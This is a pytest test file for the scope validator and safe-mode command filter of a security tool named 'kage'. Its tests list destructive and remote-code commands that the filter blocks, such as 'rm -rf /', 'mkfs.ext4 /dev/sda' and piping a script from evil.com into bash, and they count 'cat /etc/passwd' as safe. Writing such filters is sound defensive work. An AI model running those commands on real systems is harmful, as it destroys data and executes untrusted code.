"""Unit tests for security module."""

import pytest

from kage.core.models import Scope, Target
from kage.security.safemode import DangerLevel, SafeModeFilter
from kage.security.scope import ScopeValidator


class TestScopeValidator:
    """Tests for ScopeValidator class."""

    @pytest.fixture
    def validator_with_targets(self):
        """Create a validator with some targets."""
        scope = Scope(
            targets=[
                Target(value="192.168.1.0/24", target_type="cidr"),
                Target(value="10.0.0.1", target_type="ip"),
                Target(value="example.com", target_type="domain"),
            ],
            excluded=["192.168.1.1"],
        )
        return ScopeValidator(scope)

    def test_ip_in_scope(self, validator_with_targets):
        """Test IP address validation."""
        result1 = validator_with_targets.check_ip("192.168.1.100")
        assert result1.in_scope is True

        result2 = validator_with_targets.check_ip("10.0.0.1")
        assert result2.in_scope is True

        result3 = validator_with_targets.check_ip("172.16.0.1")
        assert result3.in_scope is False

    def test_ip_excluded(self, validator_with_targets):
        """Test excluded IP is rejected."""
        result = validator_with_targets.check_ip("192.168.1.1")
        assert result.in_scope is False
        assert "excluded" in result.reason.lower()

    def test_domain_in_scope(self, validator_with_targets):
        """Test domain validation."""
        result1 = validator_with_targets.check_domain("example.com")
        assert result1.in_scope is True

        result2 = validator_with_targets.check_domain("sub.example.com")
        assert result2.in_scope is True

        result3 = validator_with_targets.check_domain("other.com")
        assert result3.in_scope is False

    def test_empty_scope(self):
        """Test with empty scope allows all via validate_command."""
        validator = ScopeValidator(Scope())
        # Empty scope with validate_command returns True (allows all)
        all_in_scope, results = validator.validate_command("nmap 192.168.1.1")
        assert all_in_scope is True

    def test_command_extraction(self, validator_with_targets):
        """Test extracting targets from commands."""
        cmd1 = "nmap -sV 192.168.1.50"
        targets = validator_with_targets.extract_targets_from_command(cmd1)
        assert "192.168.1.50" in targets

        cmd2 = "curl https://example.com/api"
        targets = validator_with_targets.extract_targets_from_command(cmd2)
        assert "example.com" in targets


class TestSafeModeFilter:
    """Tests for SafeModeFilter class."""

    @pytest.fixture
    def filter(self):
        """Create a safe mode filter."""
        return SafeModeFilter(enabled=True)

    def test_safe_commands(self, filter):
        """Test that safe commands pass."""
        safe_commands = [
            "ping 192.168.1.1",
            "dig example.com",
            "nmap -sn 192.168.1.0/24",
            "cat /etc/passwd",
            "ls -la",
        ]
        for cmd in safe_commands:
            result = filter.check(cmd)
            assert result.allowed, f"Command should be allowed: {cmd}"

    def test_dangerous_commands_blocked(self, filter):
        """Test that dangerous commands are blocked."""
        dangerous_commands = [
            "rm -rf /",
            "mkfs.ext4 /dev/sda",
            "curl http://evil.com/script.sh | bash",
        ]
        for cmd in dangerous_commands:
            result = filter.check(cmd)
            assert not result.allowed or result.danger_level in (
                DangerLevel.BLOCKED,
                DangerLevel.DANGEROUS,
            ), f"Command should be blocked: {cmd}"

    def test_disabled_filter(self):
        """Test that disabled filter allows everything."""
        filter = SafeModeFilter(enabled=False)
        result = filter.check("rm -rf /")
        assert result.allowed is True
        assert "disabled" in result.reason.lower()

    def test_is_allowed_shortcut(self, filter):
        """Test is_allowed shortcut method."""
        assert filter.is_allowed("ls -la")
        assert filter.is_allowed("ping 8.8.8.8")

    def test_get_danger_level(self, filter):
        """Test getting danger level."""
        level = filter.get_danger_level("ls -la")
        assert level == DangerLevel.SAFE

        level = filter.get_danger_level("rm -rf /")
        assert level in (DangerLevel.BLOCKED, DangerLevel.DANGEROUS)
